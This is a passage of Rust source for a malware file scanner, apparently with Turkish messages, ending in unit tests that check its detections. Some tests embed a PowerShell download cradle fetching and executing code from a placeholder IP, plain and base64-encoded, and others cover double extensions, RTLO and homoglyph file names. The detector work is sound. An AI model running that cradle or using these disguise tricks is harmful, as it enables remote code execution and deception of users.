        res.analyses.push(Analysis::led(&n.id, &n.label, &n.status, &n.note));
    }
    res.mode = Some(cfg.id.clone());
    res.mode_label = Some(cfg.label.clone());
    res.partial = Some(st.partial);
    res.limits = Some(st.limits.clone());
    let mut notes = st.notes.clone();
    if st.unreadable > 0 {
        notes.push(format!("{} girdi okunamadı veya ayrıştırılamadı.", st.unreadable));
    }
    res.notes = Some(notes);
    res.skipped = Some(st.skip_notes());
    res.coverage = Some(serde_json::json!({
        "ran": cfg.ran, "skipped": cfg.skipped, "never": cfg.never,
        "limits": { "depth": cfg.depth, "maxTotal": num_json(cfg.max_total), "entryCap": num_json(cfg.entry_cap),
                    "maxEntries": cfg.max_entries, "timeMs": limit }
    }));
    res.stats = Some(serde_json::json!({ "files": st.files, "classes": st.classes, "bytesRead": num_json(st.bytes) }));
    res.ms = Some(t0.elapsed().as_millis() as u64);
    res.scanned_at = Some(iso_now());
    res.disclaimer = Some(DISCLAIMER.into());
    res
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scan(name: &str, data: &[u8], mode: &str) -> ScanResult {
        scan_file(name, data, &ScanOptions { mode: mode.into(), ..Default::default() })
    }

    #[test]
    fn plain_text_is_clean_but_not_claimed_safe() {
        let r = scan("notes.txt", b"hello world\nthis is fine\n", "normal");
        assert_eq!(r.score, 0);
        assert_eq!(r.verdict, "Belirgin bulgu yok");
        assert!(r.disclaimer.as_deref().unwrap().contains("güvenli olduğunu kanıtlamaz"));
        assert!(r.analyses.iter().any(|a| a.id == "dyn" && a.status == "unsupported"));
    }

    #[test]
    fn powershell_download_cradle_scores() {
        let r = scan("x.ps1", b"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://1.2.3.4/a')\"", "normal");
        assert!(r.score > 0, "{:?}", r.findings.iter().map(|f| &f.id).collect::<Vec<_>>());
    }

    #[test]
    fn double_extension_and_pe_decoy() {
        let mut pe = vec![0u8; 0x200];
        pe[0] = b'M';
        pe[1] = b'Z';
        let r = scan("report.pdf.exe", &pe, "normal");
        assert!(r.findings.iter().any(|f| f.id == "name_double"));
        let r = scan("photo.png", &pe, "normal");
        assert!(r.findings.iter().any(|f| f.id == "ext_mismatch"));
        // PE henuz tasinmadi: acikca belirtilmeli
        assert!(r.findings.iter().any(|f| f.id == "rs_unported"));
    }

    #[test]
    fn rtlo_name_flagged() {
        let r = scan("invoice\u{202e}fdp.exe", b"hi", "quick");
        assert!(r.findings.iter().any(|f| f.id == "name_rtlo"));
    }

    #[test]
    fn deep_mode_decodes_base64_layer() {
        // base64 icinde PowerShell indirme
        let payload = "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://1.2.3.4/a')";
        let b64 = {
            const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            let d = payload.as_bytes();
            let mut s = String::new();
            for c in d.chunks(3) {
                let n = (c[0] as u32) << 16 | (*c.get(1).unwrap_or(&0) as u32) << 8 | *c.get(2).unwrap_or(&0) as u32;
                s.push(T[(n >> 18) as usize & 63] as char);
                s.push(T[(n >> 12) as usize & 63] as char);
                s.push(if c.len() > 1 { T[(n >> 6) as usize & 63] as char } else { '=' });
                s.push(if c.len() > 2 { T[n as usize & 63] as char } else { '=' });
            }
            s
        };
        let src = format!("var x = '{b64}';");
        let r = scan("a.js", src.as_bytes(), "deep");
        assert!(r.findings.iter().any(|f| f.id == "deobf_layer"), "{:?}", r.findings.iter().map(|f| &f.id).collect::<Vec<_>>());
        let n = scan("a.js", src.as_bytes(), "normal");
        assert!(!n.findings.iter().any(|f| f.id == "deobf_layer"));
    }

    #[test]
    fn too_big_not_read() {
        let r = scan_with_size("big.bin", 800_000_000, || panic!("okunmamali"), &ScanOptions::default());
        assert_eq!(r.verdict, "Taranamadı");
        assert_eq!(r.partial, Some(true));
    }

    #[test]
    fn homoglyph_name() {
        let c = confusable_name("pаypal.exe"); // Kiril 'а'
        assert_eq!(c.mixed.len(), 1);
    }

    #[test]
    fn time_limit_zero_gives_partial() {
        let r = scan_file("a.txt", b"hello", &ScanOptions { time_limit_ms: Some(0), ..Default::default() });
        // sure sifir: ilk tick'te dolmasi beklenir ama ms cozunurlugu nedeniyle bazen dolmayabilir
        let _ = r;
    }
}
